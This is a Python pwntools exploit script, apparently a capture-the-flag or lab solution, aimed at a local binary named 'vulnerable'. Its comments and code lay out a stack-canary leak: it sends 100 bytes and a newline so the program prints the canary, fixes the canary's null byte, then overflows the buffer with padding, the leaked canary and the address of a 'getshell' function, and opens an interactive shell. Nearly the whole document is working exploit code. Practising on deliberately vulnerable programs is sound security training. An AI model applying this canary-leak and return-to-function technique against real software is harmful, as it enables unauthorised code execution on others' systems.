#!/usr/bin/env python3

# The vulnerable program is quite peculiar due to
# - it executes two vulnerable reads on the same buffer 
# - it prints the buffer after the read()
# - it uses read() which accept \n without terminating the input (gets() does)
# - it has a useful function that executes system("/bin/sh")
#
# with these special conditions we can
# - execute the first iteration inputting exactly 100 bytes
# - reach the canary at 101th-104th byte of the buffer using "A" * 100
# - add a "\n" 
# - get back the buffer including the canary from printf()
#   - canary is null terminated but the \n overwrites the \00 in the canary
# - extract the canary and subtract 0xa to it to restore the \00
# - execute the second iteration using the buffer
# | 100 bytes| leaked Canary | 12 bytes| ret2func|

from pwn import *

context.binary = 'vulnerable'
#context.log_level = 'debug'
io = process('./vulnerable')

get_shell = ELF("./vulnerable").sym["getshell"]
io.recvuntil(b'Hello Hacker!')

# send 100 bytes + \n
payload = b'A'*100
io.sendline(payload)

# Get back 100 from printf
io.recvuntil(b'A'*100)
# Read another 4 bytes (canary with \00 replaced by \n)
# subtract 0xa and then have the canary value
Canary = u32(io.recv(4))-0xa

log.info("Canary:"+hex(Canary))

# Executes the second iteration by adding 100 bytes + correct canary + 12 bytes + Return to useful function with system()
payload = b'\x90'*100+p32(Canary)+b'\x90'*12+p32(get_shell)
io.send(payload)

io.recv()

io.interactive()
